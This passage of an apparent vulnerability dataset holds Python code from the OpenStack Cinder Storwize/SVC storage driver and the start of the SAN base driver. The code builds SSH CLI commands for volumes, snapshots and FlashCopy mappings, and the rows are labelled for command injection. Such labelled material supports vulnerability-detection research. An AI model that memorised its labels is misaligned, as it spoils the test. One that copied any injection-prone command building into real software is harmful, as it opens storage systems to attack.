                                   'attribute for volume %s') % volume_name)
                raise exception.VolumeBackendAPIException(data=exception_msg)

        try:
            # Get preferred node and other nodes in I/O group
            preferred_node_entry = None
            io_group_nodes = []
            for k, node in self._storage_nodes.iteritems():
                if vol_opts['protocol'] not in node['enabled_protocols']:
                    continue
                if node['id'] == preferred_node:
                    preferred_node_entry = node
                if node['IO_group'] == IO_group:
                    io_group_nodes.append(node)

            if not len(io_group_nodes):
                exception_msg = (_('initialize_connection: No node found in '
                                   'I/O group %(gid)s for volume %(vol)s') %
                                 {'gid': IO_group, 'vol': volume_name})
                raise exception.VolumeBackendAPIException(data=exception_msg)

            if not preferred_node_entry and not vol_opts['multipath']:
                # Get 1st node in I/O group
                preferred_node_entry = io_group_nodes[0]
                LOG.warn(_('initialize_connection: Did not find a preferred '
                           'node for volume %s') % volume_name)

            properties = {}
            properties['target_discovered'] = False
            properties['target_lun'] = lun_id
            properties['volume_id'] = volume['id']
            if vol_opts['protocol'] == 'iSCSI':
                type_str = 'iscsi'
                # We take the first IP address for now. Ideally, OpenStack will
                # support iSCSI multipath for improved performance.
                if len(preferred_node_entry['ipv4']):
                    ipaddr = preferred_node_entry['ipv4'][0]
                else:
                    ipaddr = preferred_node_entry['ipv6'][0]
                properties['target_portal'] = '%s:%s' % (ipaddr, '3260')
                properties['target_iqn'] = preferred_node_entry['iscsi_name']
                properties['auth_method'] = 'CHAP'
                properties['auth_username'] = connector['initiator']
                properties['auth_password'] = chap_secret
            else:
                type_str = 'fibre_channel'
                conn_wwpns = self._get_conn_fc_wwpns(host_name)
                if not vol_opts['multipath']:
                    if preferred_node_entry['WWPN'] in conn_wwpns:
                        properties['target_wwn'] = preferred_node_entry['WWPN']
                    else:
                        properties['target_wwn'] = conn_wwpns[0]
                else:
                    properties['target_wwn'] = conn_wwpns
        except Exception:
            with excutils.save_and_reraise_exception():
                self.terminate_connection(volume, connector)
                LOG.error(_('initialize_connection: Failed to collect return '
                            'properties for volume %(vol)s and connector '
                            '%(conn)s.\n') % {'vol': str(volume),
                                              'conn': str(connector)})

        LOG.debug(_('leave: initialize_connection:\n volume: %(vol)s\n '
                    'connector %(conn)s\n properties: %(prop)s')
                  % {'vol': str(volume),
                     'conn': str(connector),
                     'prop': str(properties)})

        return {'driver_volume_type': type_str, 'data': properties, }

    def terminate_connection(self, volume, connector, **kwargs):
        """"""Cleanup after an iSCSI connection has been terminated.

        When we clean up a terminated connection between a given connector
        and volume, we:
        1. Translate the given connector to a host name
        2. Remove the volume-to-host mapping if it exists
        3. Delete the host if it has no more mappings (hosts are created
           automatically by this driver when mappings are created)
        """"""
        LOG.debug(_('enter: terminate_connection: volume %(vol)s with '
                    'connector %(conn)s') % {'vol': str(volume),
                                             'conn': str(connector)})

        vol_name = volume['name']
        host_name = self._get_host_from_connector(connector)
        # Verify that _get_host_from_connector returned the host.
        # This should always succeed as we terminate an existing connection.
        self._driver_assert(
            host_name is not None,
            _('_get_host_from_connector failed to return the host name '
              'for connector'))

        # Check if vdisk-host mapping exists, remove if it does
        mapping_data = self._get_hostvdisk_mappings(host_name)
        if vol_name in mapping_data:
            ssh_cmd = ['svctask', 'rmvdiskhostmap', '-host', host_name,
                       vol_name]
            out, err = self._run_ssh(ssh_cmd)
            # Verify CLI behaviour - no output is returned from
            # rmvdiskhostmap
            self._assert_ssh_return(len(out.strip()) == 0,
                                    'terminate_connection', ssh_cmd, out, err)
            del mapping_data[vol_name]
        else:
            LOG.error(_('terminate_connection: No mapping of volume '
                        '%(vol_name)s to host %(host_name)s found') %
                      {'vol_name': vol_name, 'host_name': host_name})

        # If this host has no more mappings, delete it
        if not mapping_data:
            self._delete_host(host_name)

        LOG.debug(_('leave: terminate_connection: volume %(vol)s with '
                    'connector %(conn)s') % {'vol': str(volume),
                                             'conn': str(connector)})

    """"""=====================================================================""""""
    """""" VOLUMES/SNAPSHOTS                                                   """"""
    """"""=====================================================================""""""

    def _get_vdisk_attributes(self, vdisk_name):
        """"""Return vdisk attributes, or None if vdisk does not exist

        Exception is raised if the information from system can not be
        parsed/matched to a single vdisk.
        """"""

        ssh_cmd = ['svcinfo', 'lsvdisk', '-bytes', '-delim', '!', vdisk_name]
        return self._execute_command_and_parse_attributes(ssh_cmd)

    def _get_vdisk_fc_mappings(self, vdisk_name):
        """"""Return FlashCopy mappings that this vdisk is associated with.""""""

        ssh_cmd = ['svcinfo', 'lsvdiskfcmappings', '-nohdr', vdisk_name]
        out, err = self._run_ssh(ssh_cmd)

        mapping_ids = []
        if (len(out.strip())):
            lines = out.strip().split('\n')
            mapping_ids = [line.split()[0] for line in lines]
        return mapping_ids

    def _get_vdisk_params(self, type_id):
        opts = self._build_default_opts()
        if type_id:
            ctxt = context.get_admin_context()
            volume_type = volume_types.get_volume_type(ctxt, type_id)
            specs = volume_type.get('extra_specs')
            for k, value in specs.iteritems():
                # Get the scope, if using scope format
                key_split = k.split(':')
                if len(key_split) == 1:
                    scope = None
                    key = key_split[0]
                else:
                    scope = key_split[0]
                    key = key_split[1]

                # We generally do not look at capabilities in the driver, but
                # protocol is a special case where the user asks for a given
                # protocol and we want both the scheduler and the driver to act
                # on the value.
                if scope == 'capabilities' and key == 'storage_protocol':
                    scope = None
                    key = 'protocol'
                    words = value.split()
                    self._driver_assert(words and
                                        len(words) == 2 and
                                        words[0] == '<in>',
                                        _('protocol must be specified as '
                                          '\'<in> iSCSI\' or \'<in> FC\''))
                    del words[0]
                    value = words[0]

                # Anything keys that the driver should look at should have the
                # 'drivers' scope.
                if scope and scope != ""drivers"":
                    continue

                if key in opts:
                    this_type = type(opts[key]).__name__
                    if this_type == 'int':
                        value = int(value)
                    elif this_type == 'bool':
                        value = strutils.bool_from_string(value)
                    opts[key] = value

        self._check_vdisk_opts(opts)
        return opts

    def _create_vdisk(self, name, size, units, opts):
        """"""Create a new vdisk.""""""

        LOG.debug(_('enter: _create_vdisk: vdisk %s ') % name)

        model_update = None
        easytier = 'on' if opts['easytier'] else 'off'

        # Set space-efficient options
        if opts['rsize'] == -1:
            ssh_cmd_se_opt = []
        else:
            ssh_cmd_se_opt = ['-rsize', '%s%%' % str(opts['rsize']),
                              '-autoexpand', '-warning',
                              '%s%%' % str(opts['warning'])]
            if not opts['autoexpand']:
                ssh_cmd_se_opt.remove('-autoexpand')

            if opts['compression']:
                ssh_cmd_se_opt.append('-compressed')
            else:
                ssh_cmd_se_opt.extend(['-grainsize', str(opts['grainsize'])])

        ssh_cmd = ['svctask', 'mkvdisk', '-name', name, '-mdiskgrp',
                   self.configuration.storwize_svc_volpool_name,
                   '-iogrp', '0', '-size', size, '-unit',
                   units, '-easytier', easytier] + ssh_cmd_se_opt
        out, err = self._run_ssh(ssh_cmd)
        self._assert_ssh_return(len(out.strip()), '_create_vdisk',
                                ssh_cmd, out, err)

        # Ensure that the output is as expected
        match_obj = re.search('Virtual Disk, id \[([0-9]+)\], '
                              'successfully created', out)
        # Make sure we got a ""successfully created"" message with vdisk id
        self._driver_assert(
            match_obj is not None,
            _('_create_vdisk %(name)s - did not find '
              'success message in CLI output.\n '
              'stdout: %(out)s\n stderr: %(err)s')
            % {'name': name, 'out': str(out), 'err': str(err)})

        LOG.debug(_('leave: _create_vdisk: volume %s ') % name)

    def _make_fc_map(self, source, target, full_copy):
        fc_map_cli_cmd = ['svctask', 'mkfcmap', '-source', source, '-target',
                          target, '-autodelete']
        if not full_copy:
            fc_map_cli_cmd.extend(['-copyrate', '0'])
        out, err = self._run_ssh(fc_map_cli_cmd)
        self._driver_assert(
            len(out.strip()),
            _('create FC mapping from %(source)s to %(target)s - '
              'did not find success message in CLI output.\n'
              ' stdout: %(out)s\n stderr: %(err)s\n')
            % {'source': source,
               'target': target,
               'out': str(out),
               'err': str(err)})

        # Ensure that the output is as expected
        match_obj = re.search('FlashCopy Mapping, id \[([0-9]+)\], '
                              'successfully created', out)
        # Make sure we got a ""successfully created"" message with vdisk id
        self._driver_assert(
            match_obj is not None,
            _('create FC mapping from %(source)s to %(target)s - '
              'did not find success message in CLI output.\n'
              ' stdout: %(out)s\n stderr: %(err)s\n')
            % {'source': source,
               'target': target,
               'out': str(out),
               'err': str(err)})

        try:
            fc_map_id = match_obj.group(1)
            self._driver_assert(
                fc_map_id is not None,
                _('create FC mapping from %(source)s to %(target)s - '
                  'did not find mapping id in CLI output.\n'
                  ' stdout: %(out)s\n stderr: %(err)s\n')
                % {'source': source,
                   'target': target,
                   'out': str(out),
                   'err': str(err)})
        except IndexError:
            self._driver_assert(
                False,
                _('create FC mapping from %(source)s to %(target)s - '
                  'did not find mapping id in CLI output.\n'
                  ' stdout: %(out)s\n stderr: %(err)s\n')
                % {'source': source,
                   'target': target,
                   'out': str(out),
                   'err': str(err)})
        return fc_map_id

    def _call_prepare_fc_map(self, fc_map_id, source, target):
        try:
            out, err = self._run_ssh(['svctask', 'prestartfcmap', fc_map_id])
        except exception.ProcessExecutionError as e:
            with excutils.save_and_reraise_exception():
                LOG.error(_('_prepare_fc_map: Failed to prepare FlashCopy '
                            'from %(source)s to %(target)s.\n'
                            'stdout: %(out)s\n stderr: %(err)s')
                          % {'source': source,
                             'target': target,
                             'out': e.stdout,
                             'err': e.stderr})

    def _prepare_fc_map(self, fc_map_id, source, target):
        self._call_prepare_fc_map(fc_map_id, source, target)
        mapping_ready = False
        wait_time = 5
        # Allow waiting of up to timeout (set as parameter)
        timeout = self.configuration.storwize_svc_flashcopy_timeout
        max_retries = (timeout / wait_time) + 1
        for try_number in range(1, max_retries):
            mapping_attrs = self._get_flashcopy_mapping_attributes(fc_map_id)
            if (mapping_attrs is None or
                    'status' not in mapping_attrs):
                break
            if mapping_attrs['status'] == 'prepared':
                mapping_ready = True
                break
            elif mapping_attrs['status'] == 'stopped':
                self._call_prepare_fc_map(fc_map_id, source, target)
            elif mapping_attrs['status'] != 'preparing':
                # Unexpected mapping status
                exception_msg = (_('Unexecpted mapping status %(status)s '
                                   'for mapping %(id)s. Attributes: '
                                   '%(attr)s')
                                 % {'status': mapping_attrs['status'],
                                    'id': fc_map_id,
                                    'attr': mapping_attrs})
                raise exception.VolumeBackendAPIException(data=exception_msg)
            # Need to wait for mapping to be prepared, wait a few seconds
            time.sleep(wait_time)

        if not mapping_ready:
            exception_msg = (_('Mapping %(id)s prepare failed to complete '
                               'within the allotted %(to)d seconds timeout. '
                               'Terminating.')
                             % {'id': fc_map_id,
                                'to': timeout})
            LOG.error(_('_prepare_fc_map: Failed to start FlashCopy '
                        'from %(source)s to %(target)s with '
                        'exception %(ex)s')
                      % {'source': source,
                         'target': target,
                         'ex': exception_msg})
            raise exception.InvalidSnapshot(
                reason=_('_prepare_fc_map: %s') % exception_msg)

    def _start_fc_map(self, fc_map_id, source, target):
        try:
            out, err = self._run_ssh(['svctask', 'startfcmap', fc_map_id])
        except exception.ProcessExecutionError as e:
            with excutils.save_and_reraise_exception():
                LOG.error(_('_start_fc_map: Failed to start FlashCopy '
                            'from %(source)s to %(target)s.\n'
                            'stdout: %(out)s\n stderr: %(err)s')
                          % {'source': source,
                             'target': target,
                             'out': e.stdout,
                             'err': e.stderr})

    def _run_flashcopy(self, source, target, full_copy=True):
        """"""Create a FlashCopy mapping from the source to the target.""""""

        LOG.debug(_('enter: _run_flashcopy: execute FlashCopy from source '
                    '%(source)s to target %(target)s') %
                  {'source': source, 'target': target})

        fc_map_id = self._make_fc_map(source, target, full_copy)
        try:
            self._prepare_fc_map(fc_map_id, source, target)
            self._start_fc_map(fc_map_id, source, target)
        except Exception:
            with excutils.save_and_reraise_exception():
                self._delete_vdisk(target, True)

        LOG.debug(_('leave: _run_flashcopy: FlashCopy started from '
                    '%(source)s to %(target)s') %
                  {'source': source, 'target': target})

    def _create_copy(self, src_vdisk, tgt_vdisk, full_copy, opts, src_id,
                     from_vol):
        """"""Create a new snapshot using FlashCopy.""""""

        LOG.debug(_('enter: _create_copy: snapshot %(tgt_vdisk)s from '
                    'vdisk %(src_vdisk)s') %
                  {'tgt_vdisk': tgt_vdisk, 'src_vdisk': src_vdisk})

        src_vdisk_attributes = self._get_vdisk_attributes(src_vdisk)
        if src_vdisk_attributes is None:
            exception_msg = (
                _('_create_copy: Source vdisk %s does not exist')
                % src_vdisk)
            LOG.error(exception_msg)
            if from_vol:
                raise exception.VolumeNotFound(exception_msg,
                                               volume_id=src_id)
            else:
                raise exception.SnapshotNotFound(exception_msg,
                                                 snapshot_id=src_id)

        self._driver_assert(
            'capacity' in src_vdisk_attributes,
            _('_create_copy: cannot get source vdisk '
              '%(src)s capacity from vdisk attributes '
              '%(attr)s')
            % {'src': src_vdisk,
               'attr': src_vdisk_attributes})

        src_vdisk_size = src_vdisk_attributes['capacity']
        self._create_vdisk(tgt_vdisk, src_vdisk_size, 'b', opts)
        self._run_flashcopy(src_vdisk, tgt_vdisk, full_copy)

        LOG.debug(_('leave: _create_copy: snapshot %(tgt_vdisk)s from '
                    'vdisk %(src_vdisk)s') %
                  {'tgt_vdisk': tgt_vdisk, 'src_vdisk': src_vdisk})

    def _get_flashcopy_mapping_attributes(self, fc_map_id):
        LOG.debug(_('enter: _get_flashcopy_mapping_attributes: mapping %s')
                  % fc_map_id)

        fc_ls_map_cmd = ['svcinfo', 'lsfcmap', '-filtervalue',
                         'id=%s' % fc_map_id, '-delim', '!']
        out, err = self._run_ssh(fc_ls_map_cmd)
        if not len(out.strip()):
            return None

        # Get list of FlashCopy mappings
        # We expect zero or one line if mapping does not exist,
        # two lines if it does exist, otherwise error
        lines = out.strip().split('\n')
        self._assert_ssh_return(len(lines) <= 2,
                                '_get_flashcopy_mapping_attributes',
                                fc_ls_map_cmd, out, err)

        if len(lines) == 2:
            attributes = self._get_hdr_dic(lines[0], lines[1], '!')
        else:  # 0 or 1 lines
            attributes = None

        LOG.debug(_('leave: _get_flashcopy_mapping_attributes: mapping '
                    '%(fc_map_id)s, attributes %(attributes)s') %
                  {'fc_map_id': fc_map_id, 'attributes': attributes})

        return attributes

    def _is_vdisk_defined(self, vdisk_name):
        """"""Check if vdisk is defined.""""""
        LOG.debug(_('enter: _is_vdisk_defined: vdisk %s ') % vdisk_name)
        vdisk_attributes = self._get_vdisk_attributes(vdisk_name)
        LOG.debug(_('leave: _is_vdisk_defined: vdisk %(vol)s with %(str)s ')
                  % {'vol': vdisk_name,
                     'str': vdisk_attributes is not None})
        if vdisk_attributes is None:
            return False
        else:
            return True

    def _ensure_vdisk_no_fc_mappings(self, name, allow_snaps=True):
        # Ensure vdisk has no FlashCopy mappings
        mapping_ids = self._get_vdisk_fc_mappings(name)
        while len(mapping_ids):
            wait_for_copy = False
            for map_id in mapping_ids:
                attrs = self._get_flashcopy_mapping_attributes(map_id)
                if not attrs:
                    continue
                source = attrs['source_vdisk_name']
                target = attrs['target_vdisk_name']
                copy_rate = attrs['copy_rate']
                status = attrs['status']

                if copy_rate == '0':
                    # Case #2: A vdisk that has snapshots
                    if source == name:
                        if not allow_snaps:
                            return False
                        ssh_cmd = ['svctask', 'chfcmap', '-copyrate', '50',
                                   '-autodelete', 'on', map_id]
                        out, err = self._run_ssh(ssh_cmd)
                        wait_for_copy = True
                    # Case #3: A snapshot
                    else:
                        msg = (_('Vdisk %(name)s not involved in '
                                 'mapping %(src)s -> %(tgt)s') %
                               {'name': name, 'src': source, 'tgt': target})
                        self._driver_assert(target == name, msg)
                        if status in ['copying', 'prepared']:
                            self._run_ssh(['svctask', 'stopfcmap', map_id])
                        elif status in ['stopping', 'preparing']:
                            wait_for_copy = True
                        else:
                            self._run_ssh(['svctask', 'rmfcmap', '-force',
                                           map_id])
                # Case 4: Copy in progress - wait and will autodelete
                else:
                    if status == 'prepared':
                        self._run_ssh(['svctask', 'stopfcmap', map_id])
                        self._run_ssh(['svctask', 'rmfcmap', '-force', map_id])
                    elif status == 'idle_or_copied':
                        # Prepare failed
                        self._run_ssh(['svctask', 'rmfcmap', '-force', map_id])
                    else:
                        wait_for_copy = True
            if wait_for_copy:
                time.sleep(5)
            mapping_ids = self._get_vdisk_fc_mappings(name)
        return True

    def _delete_vdisk(self, name, force):
        """"""Deletes existing vdisks.

        It is very important to properly take care of mappings before deleting
        the disk:
        1. If no mappings, then it was a vdisk, and can be deleted
        2. If it is the source of a flashcopy mapping and copy_rate is 0, then
           it is a vdisk that has a snapshot.  If the force flag is set,
           delete the mapping and the vdisk, otherwise set the mapping to
           copy and wait (this will allow users to delete vdisks that have
           snapshots if/when the upper layers allow it).
        3. If it is the target of a mapping and copy_rate is 0, it is a
           snapshot, and we should properly stop the mapping and delete.
        4. If it is the source/target of a mapping and copy_rate is not 0, it
           is a clone or vdisk created from a snapshot.  We wait for the copy
           to complete (the mapping will be autodeleted) and then delete the
           vdisk.

        """"""

        LOG.debug(_('enter: _delete_vdisk: vdisk %s') % name)

        # Try to delete volume only if found on the storage
        vdisk_defined = self._is_vdisk_defined(name)
        if not vdisk_defined:
            LOG.info(_('warning: Tried to delete vdisk %s but it does not '
                       'exist.') % name)
            return

        self._ensure_vdisk_no_fc_mappings(name)

        ssh_cmd = ['svctask', 'rmvdisk', '-force', name]
        if not force:
            ssh_cmd.remove('-force')
        out, err = self._run_ssh(ssh_cmd)
        # No output should be returned from rmvdisk
        self._assert_ssh_return(len(out.strip()) == 0,
                                ('_delete_vdisk %(name)s')
                                % {'name': name},
                                ssh_cmd, out, err)
        LOG.debug(_('leave: _delete_vdisk: vdisk %s') % name)

    def create_volume(self, volume):
        opts = self._get_vdisk_params(volume['volume_type_id'])
        return self._create_vdisk(volume['name'], str(volume['size']), 'gb',
                                  opts)

    def delete_volume(self, volume):
        self._delete_vdisk(volume['name'], False)

    def create_snapshot(self, snapshot):
        source_vol = self.db.volume_get(self._context, snapshot['volume_id'])
        opts = self._get_vdisk_params(source_vol['volume_type_id'])
        self._create_copy(src_vdisk=snapshot['volume_name'],
                          tgt_vdisk=snapshot['name'],
                          full_copy=False,
                          opts=opts,
                          src_id=snapshot['volume_id'],
                          from_vol=True)

    def delete_snapshot(self, snapshot):
        self._delete_vdisk(snapshot['name'], False)

    def create_volume_from_snapshot(self, volume, snapshot):
        if volume['size'] != snapshot['volume_size']:
            exception_message = (_('create_volume_from_snapshot: '
                                   'Source and destination size differ.'))
            raise exception.VolumeBackendAPIException(data=exception_message)

        opts = self._get_vdisk_params(volume['volume_type_id'])
        self._create_copy(src_vdisk=snapshot['name'],
                          tgt_vdisk=volume['name'],
                          full_copy=True,
                          opts=opts,
                          src_id=snapshot['id'],
                          from_vol=False)

    def create_cloned_volume(self, tgt_volume, src_volume):
        if src_volume['size'] != tgt_volume['size']:
            exception_message = (_('create_cloned_volume: '
                                   'Source and destination size differ.'))
            raise exception.VolumeBackendAPIException(data=exception_message)

        opts = self._get_vdisk_params(tgt_volume['volume_type_id'])
        self._create_copy(src_vdisk=src_volume['name'],
                          tgt_vdisk=tgt_volume['name'],
                          full_copy=True,
                          opts=opts,
                          src_id=src_volume['id'],
                          from_vol=True)

    def extend_volume(self, volume, new_size):
        LOG.debug(_('enter: extend_volume: volume %s') % volume['id'])
        ret = self._ensure_vdisk_no_fc_mappings(volume['name'],
                                                allow_snaps=False)
        if not ret:
            exception_message = (_('extend_volume: Extending a volume with '
                                   'snapshots is not supported.'))
            raise exception.VolumeBackendAPIException(data=exception_message)

        extend_amt = int(new_size) - volume['size']
        ssh_cmd = (['svctask', 'expandvdisksize', '-size', str(extend_amt),
                    '-unit', 'gb', volume['name']])
        out, err = self._run_ssh(ssh_cmd)
        # No output should be returned from expandvdisksize
        self._assert_ssh_return(len(out.strip()) == 0, 'extend_volume',
                                ssh_cmd, out, err)
        LOG.debug(_('leave: extend_volume: volume %s') % volume['id'])

    """"""=====================================================================""""""
    """""" MISC/HELPERS                                                        """"""
    """"""=====================================================================""""""

    def get_volume_stats(self, refresh=False):
        """"""Get volume stats.

        If we haven't gotten stats yet or 'refresh' is True,
        run update the stats first.
        """"""
        if not self._stats or refresh:
            self._update_volume_stats()

        return self._stats

    def _update_volume_stats(self):
        """"""Retrieve stats info from volume group.""""""

        LOG.debug(_(""Updating volume stats""))
        data = {}

        data['vendor_name'] = 'IBM'
        data['driver_version'] = '1.1'
        data['storage_protocol'] = list(self._enabled_protocols)

        data['total_capacity_gb'] = 0  # To be overwritten
        data['free_capacity_gb'] = 0   # To be overwritten
        data['reserved_percentage'] = 0
        data['QoS_support'] = False

        pool = self.configuration.storwize_svc_volpool_name
        #Get storage system name
        ssh_cmd = ['svcinfo', 'lssystem', '-delim', '!']
        attributes = self._execute_command_and_parse_attributes(ssh_cmd)
        if not attributes or not attributes['name']:
            exception_message = (_('_update_volume_stats: '
                                   'Could not get system name'))
            raise exception.VolumeBackendAPIException(data=exception_message)

        backend_name = self.configuration.safe_get('volume_backend_name')
        if not backend_name:
            backend_name = '%s_%s' % (attributes['name'], pool)
        data['volume_backend_name'] = backend_name

        ssh_cmd = ['svcinfo', 'lsmdiskgrp', '-bytes', '-delim', '!', pool]
        attributes = self._execute_command_and_parse_attributes(ssh_cmd)
        if not attributes:
            LOG.error(_('Could not get pool data from the storage'))
            exception_message = (_('_update_volume_stats: '
                                   'Could not get storage pool data'))
            raise exception.VolumeBackendAPIException(data=exception_message)

        data['total_capacity_gb'] = (float(attributes['capacity']) /
                                    (1024 ** 3))
        data['free_capacity_gb'] = (float(attributes['free_capacity']) /
                                    (1024 ** 3))
        data['easytier_support'] = attributes['easy_tier'] in ['on', 'auto']
        data['compression_support'] = self._compression_enabled

        self._stats = data

    def _port_conf_generator(self, cmd):
        ssh_cmd = cmd + ['-delim', '!']
        out, err = self._run_ssh(ssh_cmd)

        if not len(out.strip()):
            return
        port_lines = out.strip().split('\n')
        if not len(port_lines):
            return

        header = port_lines.pop(0)
        yield header
        for portip_line in port_lines:
            try:
                port_data = self._get_hdr_dic(header, portip_line, '!')
            except exception.VolumeBackendAPIException:
                with excutils.save_and_reraise_exception():
                    self._log_cli_output_error('_port_conf_generator',
                                               ssh_cmd, out, err)
            yield port_data

    def _check_vdisk_opts(self, opts):
        # Check that rsize is either -1 or between 0 and 100
        if not (opts['rsize'] >= -1 and opts['rsize'] <= 100):
            raise exception.InvalidInput(
                reason=_('Illegal value specified for storwize_svc_vol_rsize: '
                         'set to either a percentage (0-100) or -1'))

        # Check that warning is either -1 or between 0 and 100
        if not (opts['warning'] >= -1 and opts['warning'] <= 100):
            raise exception.InvalidInput(
                reason=_('Illegal value specified for '
                         'storwize_svc_vol_warning: '
                         'set to a percentage (0-100)'))

        # Check that grainsize is 32/64/128/256
        if opts['grainsize'] not in [32, 64, 128, 256]:
            raise exception.InvalidInput(
                reason=_('Illegal value specified for '
                         'storwize_svc_vol_grainsize: set to either '
                         '32, 64, 128, or 256'))

        # Check that compression is supported
        if opts['compression'] and not self._compression_enabled:
            raise exception.InvalidInput(
                reason=_('System does not support compression'))

        # Check that rsize is set if compression is set
        if opts['compression'] and opts['rsize'] == -1:
            raise exception.InvalidInput(
                reason=_('If compression is set to True, rsize must '
                         'also be set (not equal to -1)'))

        # Check that the requested protocol is enabled
        if opts['protocol'] not in self._enabled_protocols:
            raise exception.InvalidInput(
                reason=_('Illegal value %(prot)s specified for '
                         'storwize_svc_connection_protocol: '
                         'valid values are %(enabled)s')
                % {'prot': opts['protocol'],
                   'enabled': ','.join(self._enabled_protocols)})

        # Check that multipath is only enabled for fc
        if opts['protocol'] != 'FC' and opts['multipath']:
            raise exception.InvalidInput(
                reason=_('Multipath is currently only supported for FC '
                         'connections and not iSCSI.  (This is a Nova '
                         'limitation.)'))

    def _execute_command_and_parse_attributes(self, ssh_cmd):
        """"""Execute command on the Storwize/SVC and parse attributes.

        Exception is raised if the information from the system
        can not be obtained.

        """"""

        LOG.debug(_('enter: _execute_command_and_parse_attributes: '
                    ' command %s') % str(ssh_cmd))

        try:
            out, err = self._run_ssh(ssh_cmd)
        except exception.ProcessExecutionError as e:
            # Didn't get details from the storage, return None
            LOG.error(_('CLI Exception output:\n command: %(cmd)s\n '
                        'stdout: %(out)s\n stderr: %(err)s') %
                      {'cmd': ssh_cmd,
                       'out': e.stdout,
                       'err': e.stderr})
            return None

        self._assert_ssh_return(len(out),
                                '_execute_command_and_parse_attributes',
                                ssh_cmd, out, err)
        attributes = {}
        for attrib_line in out.split('\n'):
            # If '!' not found, return the string and two empty strings
            attrib_name, foo, attrib_value = attrib_line.partition('!')
            if attrib_name is not None and len(attrib_name.strip()):
                attributes[attrib_name] = attrib_value

        LOG.debug(_('leave: _execute_command_and_parse_attributes:\n'
                    'command: %(cmd)s\n'
                    'attributes: %(attr)s')
                  % {'cmd': str(ssh_cmd),
                     'attr': str(attributes)})

        return attributes

    def _get_hdr_dic(self, header, row, delim):
        """"""Return CLI row data as a dictionary indexed by names from header.
        string. The strings are converted to columns using the delimiter in
        delim.
        """"""

        attributes = header.split(delim)
        values = row.split(delim)
        self._driver_assert(
            len(values) ==
            len(attributes),
            _('_get_hdr_dic: attribute headers and values do not match.\n '
              'Headers: %(header)s\n Values: %(row)s')
            % {'header': str(header),
               'row': str(row)})
        dic = dict((a, v) for a, v in map(None, attributes, values))
        return dic

    def _log_cli_output_error(self, function, cmd, out, err):
        LOG.error(_('%(fun)s: Failed with unexpected CLI output.\n '
                    'Command: %(cmd)s\nstdout: %(out)s\nstderr: %(err)s\n')
                  % {'fun': function, 'cmd': cmd,
                     'out': str(out), 'err': str(err)})

    def _driver_assert(self, assert_condition, exception_message):
        """"""Internal assertion mechanism for CLI output.""""""
        if not assert_condition:
            LOG.error(exception_message)
            raise exception.VolumeBackendAPIException(data=exception_message)

    def _assert_ssh_return(self, test, fun, ssh_cmd, out, err):
        self._driver_assert(
            test,
            _('%(fun)s: Failed with unexpected CLI output.\n '
              'Command: %(cmd)s\n stdout: %(out)s\n stderr: %(err)s')
            % {'fun': fun,
               'cmd': ssh_cmd,
               'out': str(out),
               'err': str(err)})

    def _handle_keyerror(self, function, header):
        msg = (_('Did not find expected column in %(fun)s: %(hdr)s') %
               {'fun': function, 'hdr': header})
        LOG.error(msg)
        raise exception.VolumeBackendAPIException(
            data=msg)


class CLIResponse(object):
    '''Parse SVC CLI output and generate iterable'''

    def __init__(self, raw, delim='!', with_header=True):
        super(CLIResponse, self).__init__()
        self.raw = raw
        self.delim = delim
        self.with_header = with_header
        self.result = self._parse()

    def select(self, *keys):
        for a in self.result:
            vs = []
            for k in keys:
                v = a.get(k, None)
                if isinstance(v, basestring):
                    v = [v]
                if isinstance(v, list):
                    vs.append(v)
            for item in zip(*vs):
                yield item

    def __getitem__(self, key):
        return self.result[key]

    def __iter__(self):
        for a in self.result:
            yield a

    def __len__(self):
        return len(self.result)

    def _parse(self):
        def get_reader(content, delim):
            for line in content.lstrip().splitlines():
                line = line.strip()
                if line:
                    yield line.split(delim)
                else:
                    yield []

        if isinstance(self.raw, basestring):
            stdout, stderr = self.raw, ''
        else:
            stdout, stderr = self.raw
        reader = get_reader(stdout, self.delim)
        result = []

        if self.with_header:
            hds = tuple()
            for row in reader:
                hds = row
                break
            for row in reader:
                cur = dict()
                for k, v in zip(hds, row):
                    CLIResponse.append_dict(cur, k, v)
                result.append(cur)
        else:
            cur = dict()
            for row in reader:
                if row:
                    CLIResponse.append_dict(cur, row[0], ' '.join(row[1:]))
                elif cur:  # start new section
                    result.append(cur)
                    cur = dict()
            if cur:
                result.append(cur)
        return result

    @staticmethod
    def append_dict(dict_, key, value):
        key, value = key.strip(), value.strip()
        obj = dict_.get(key, None)
        if obj is None:
            dict_[key] = value
        elif isinstance(obj, list):
            obj.append(value)
            dict_[key] = obj
        else:
            dict_[key] = [obj, value]
        return dict_
/n/n/n",0,command_injection
5,75,f752302d181583a95cf44354aea607ce9d9283f4,"/cinder/volume/drivers/san/san.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4

# Copyright 2011 Justin Santa Barbara
# All Rights Reserved.
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
""""""
Default Driver for san-stored volumes.

The unique thing about a SAN is that we don't expect that we can run the volume
controller on the SAN hardware.  We expect to access it over SSH or some API.
""""""

import random

from eventlet import greenthread
from oslo.config import cfg

from cinder import exception
from cinder.openstack.common import excutils
from cinder.openstack.common import log as logging
from cinder import utils
from cinder.volume import driver

LOG = logging.getLogger(__name__)

san_opts = [
    cfg.BoolOpt('san_thin_provision',
                default=True,
                help='Use thin provisioning for SAN volumes?'),
    cfg.StrOpt('san_ip',
               default='',
               help='IP address of SAN controller'),
    cfg.StrOpt('san_login',
               default='admin',
               help='Username for SAN controller'),
    cfg.StrOpt('san_password',
               default='',
               help='Password for SAN controller',
               secret=True),
    cfg.StrOpt('san_private_key',
               default='',
               help='Filename of private key to use for SSH authentication'),
    cfg.StrOpt('san_clustername',
               default='',
               help='Cluster name to use for creating volumes'),
    cfg.IntOpt('san_ssh_port',
               default=22,
               help='SSH port to use with SAN'),
    cfg.BoolOpt('san_is_local',
                default=False,
                help='Execute commands locally instead of over SSH; '
                     'use if the volume service is running on the SAN device'),
    cfg.IntOpt('ssh_conn_timeout',
               default=30,
               help=""SSH connection timeout in seconds""),
    cfg.IntOpt('ssh_min_pool_conn',
               default=1,
               help='Minimum ssh connections in the pool'),
    cfg.IntOpt('ssh_max_pool_conn',
               default=5,
               help='Maximum ssh connections in the pool'),
]

CONF = cfg.CONF
CONF.register_opts(san_opts)


class SanDriver(driver.VolumeDriver):
